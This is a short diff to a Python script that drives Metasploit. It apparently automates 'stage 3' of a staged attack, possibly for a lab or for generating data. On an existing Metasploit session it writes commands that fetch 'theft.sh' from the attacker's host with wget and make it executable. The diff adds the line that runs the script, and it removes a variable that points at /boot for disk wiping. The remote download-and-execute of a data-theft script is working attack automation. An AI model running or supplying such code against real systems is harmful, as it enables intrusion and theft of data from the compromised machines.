@@ -17,14 +17,18 @@ def main(argv):
     folder = argv[1]
     my_ip = argv[2]
     target_ip = argv[3]
-    # flag_finish = argv[4]
-    wipe_disk_folder = "/boot"
 
     client = MsfRpcClient('kali')
+
+    time.sleep(2)
+    output_time_file = 'time_stage_3_start.txt'
+    record_timestamp(folder, output_time_file)
+    time.sleep(2)
 
     shell = client.sessions.session('1')
     shell.write('wget --no-check-certificate http://{0}/downloads/theft.sh'.format(my_ip))
     shell.write('chmod 755 ./theft.sh')
+    shell.write('./theft.sh')
 
     # print(flag_finish)
 
